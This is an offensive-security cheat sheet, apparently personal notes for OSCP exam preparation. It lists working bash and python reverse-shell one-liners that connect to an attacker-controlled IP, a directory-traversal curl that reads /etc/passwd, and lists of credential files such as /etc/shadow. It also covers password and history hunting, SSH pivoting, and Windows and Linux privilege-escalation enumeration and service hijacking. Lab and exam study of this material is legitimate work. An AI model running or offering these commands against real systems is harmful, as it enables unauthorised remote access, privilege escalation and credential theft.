# Table of Content
- [General](#general)
  - [Important Files](#important-files)
  - [Reverse Shell](#reverse-shell)
- [SSH](#ssh)
  - [SSH KEY](#ssh-key)
  - [SSH Tunneling](#ssh-tunneling)
- [Web Attacks](#web-attacks)
- [Windows Privilege Escalation](#windows-privilege-escalation)
  - [Manual Enumeration](#manual-enumeration)
  - [Service Binary Hijacking](#service-binary-hijacking)
  - [Service DLL Hijacking](#service-dll-hijacking)
  - [Unquoted Service Paths](#unquoted-service-paths)
  - [Scheduled Tasks](#scheduled-tasks)
  - [SeImpersonatePrivilege](#seimpersonateprivilege)
  - [SeBackupPrivilege](#sebackupprivilege)
- [Linux Privilege Escalation](#linux-privilege-escalation)
  - [Linux Manual Enumeration](#linux-manual-enumeration)

# General
## Important Files
- Windows

```bash

C:/Users/Administrator/NTUser.dat
```
- Linux
```bash
/etc/passwd
/etc/shadow
/etc/aliases
```

## Reverse Shell
```bash
# bash reverse shell
bash -i >& /dev/tcp/192.168.45.x/80 0>&1
bash -c 'bash -i >& /dev/tcp/192.168.45.x/80 0>&1'

# python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.x",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# when escaping double quotes
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.175\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
```

## Tools
### feroxbuster 
```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.222.62/ -C 404,401,403,502,500 -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config
feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
```

### gobuster
```bash
gobuster dir -u http://<% tp.frontmatter["RHOST"] %>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```

### curl
![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
```bash
# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
We can find the stack information as well(ex. saltstack)
curl -v target:port

# directory traversal
curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
```

# SSH
## SSH Keygen
- See if other users can login as root using ssh key

```bash
# Generate ssh key:
ssh-keygen

# Connect with ssh key:
ssh -i id_rsa root@192.168.x.x

# To handle "Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures" error:
ssh -i id_rsa root@192.168.x.x -o IdentitiesOnly=yes
```

## SSH Tennling
```bash
# Local port forwarding
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Local dynamic port forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

# Remote port forwarding
sudo systemctl start ssh
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Remote dynamic port forwarding
ssh -N -R 9998 kali@192.168.118.4

```


# Web Attacks

## input form
- Input form: check with burpsuite
- SQLi
- Check to see if we can modify post data


## Directory Traversal
- Make sure to read and try exploit codes' examples
- Use curl --path-as-is or burp suite
- Check .ssh directory
- Check if we can read other vulnerable app's config file through this vulnerability
- Check other user's home directories to see the name of the files(pg practice cassandra)
- If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)





# Windows Privilege Escalation

## Manual Enumeration

```bash
#User information&hostname
whoami
whoami /priv
whoami /groups
whoami /all

#Existing users and groups
net user
  Get-LocalUser
net localgroup
  Get-LocalGroup
net localgroup adminteam
  Get-LocalGroupMember adminteam

#System information
systeminfo

#IP
ipconfig /all

#Routing table
route print

#Active network
netstat -ano

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# cmdkey /list

#Installed Applications
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
C:\Program Files\...
C:\Program Files (x86)\...

#Running processes
Get-Process

#Juicy files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.git,*.gitconfig,*.config -File -Recurse -ErrorAction SilentlyContinue
Check every user's directory && desktop && documents && downloads

dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath
  type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Public\Transcript...

```

## Service Binary Hijacking
```bash

# Get a list of all installed windows services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartMode | Where-Object {$_.State -like 'Running'}
sc query | findstr /i servname

# Check StartMode
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.State -like 'Running'}
sc qc servicename

# Search for Modifiable services/executables with PowerUP.ps1
. .\PowerUp.ps1
Get-ModifiableServiceFile

icacls "C:\xampp\apache\bin\httpd.exe"

#restart service
net stop service && net start service
Restart-Service service

#When we can't restart the service but we have seshutdown privilege
shutdown /r /t 0

```

## Service DLL Hijacking
```bash
```

## Scheduled Tasks
```bash
# Scheduled tasks: Check Process || query schtasks
Get-ScheduledTask
schtasks /query /fo LIST /v
Get-Process
  Focus on Last Run Time, Next Run Time, Run As User Task To Run
  Check executable path with icacls to see if we can replace the exe file

# Or Find Process with Watch-Command.ps1 https://github.com/markwragg/PowerShell-Watch/blob/master/README.md
> . .\Watch-Command.ps1
> Watch-Command -ScriptBlock { Get-Process }

```

## Unquoted Service Paths
```bash
```

## SeImpersonatePrivilege

# Linux Privilege Escalation
## Linux Manual Enumeration

```bash
# User context
id
hostname

# Check User files(Everyone if you can)
cat /home/user/.bash_aliases
cat /home/user/.bash_history

# Enumerate other userse
cat /etc/passwd

# Operating system release and version
cat /etc/issue
cat /etc/os-release

# Kernel version and architecture
uname -a

# Running process
ps aux
ps auxwww

# Network interface
ip a

# Route
routel

# Active network connections
ss -anp

# Firewall rule
cat /etc/iptables/rules.v4

# Cronjob
ls -lah /etc/cron*
cat /etc/crontab
crontab -l

# Installed applications
dpkg -l

# Every directory writable by the current user
find / -writable -type d 2>/dev/null

# SUID-marked binaries
find / -perm -u=s -type f 2>/dev/null

# List all mounted filesystems
mount

# List all drives that will be mounted at boot time
cat /etc/fstab

# List all available disks
lsblk
```
